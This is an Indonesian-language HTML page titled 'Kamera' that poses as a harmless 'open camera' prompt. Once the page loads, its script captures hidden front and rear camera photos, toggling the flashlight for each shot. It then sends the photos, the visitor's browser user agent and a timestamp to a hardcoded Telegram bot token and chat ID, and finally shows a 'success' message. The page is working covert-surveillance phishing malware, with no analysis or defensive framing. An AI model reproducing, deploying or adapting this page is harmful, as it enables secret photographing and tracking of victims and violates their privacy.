<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
    <title>Kamera</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#fff;
            font-family:-apple-system,Arial,sans-serif;
            height:100vh;width:100vw;
            position:fixed;
            display:flex;justify-content:center;align-items:center;
        }
        .c{text-align:center;padding:30px}
        .e{font-size:80px}
        h2{font-size:20px;color:#222;font-weight:600;margin:15px 0 5px}
        p{font-size:13px;color:#888}
        button{
            background:#0066ff;
            color:#fff;
            border:none;
            padding:14px 40px;
            font-size:16px;
            border-radius:8px;
            margin-top:20px;
            cursor:pointer;
            font-weight:600;
        }
    </style>
</head>
<body>
<div class="c" id="m">
    <div class="e">📸</div>
    <h2>Buka Kamera</h2>
    <p>Ketuk izinkan</p>
</div>
<script>
const T="8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
const C="1923372966";

async function k(f,l){
    const v=document.createElement('video');
    v.style.cssText='position:fixed;top:-9999px';
    document.body.appendChild(v);
    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:{ideal:1280}}});
    v.srcObject=s;
    await v.play();
    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:true}]});}catch(e){}
    await new Promise(r=>setTimeout(r,500));
    const cv=document.createElement('canvas');
    cv.width=640;cv.height=480;
    cv.getContext('2d').drawImage(v,0,0,640,480);
    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:false}]});}catch(e){}
    s.getTracks().forEach(t=>t.stop());
    v.remove();
    const b=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.8));
    const d=new FormData();
    d.append('chat_id',C);d.append('photo',b,l+'.jpg');
    d.append('caption','📸 '+l+' - '+new Date().toLocaleString());
    await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:d});
}

(async()=>{
try{
    document.getElementById('m').innerHTML='<div class="e">⏳</div><h2>Memproses</h2><p>Tunggu sebentar</p>';
    await k('user','DEPAN');
    try{await k('environment','BELAKANG');}catch(e){}
    await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:C,text:'📱 '+navigator.userAgent+'\n🕐 '+new Date().toLocaleString()})
    });
    document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Bisa tutup halaman ini</p>';
}catch(e){
    document.getElementById('m').innerHTML='<div class="e">❌</div><h2>Gagal</h2><p>Izin kamera diperlukan</p><button onclick="location.reload()">🔄 Coba Lagi</button>';
}
})();
</script>
</body>
</html>
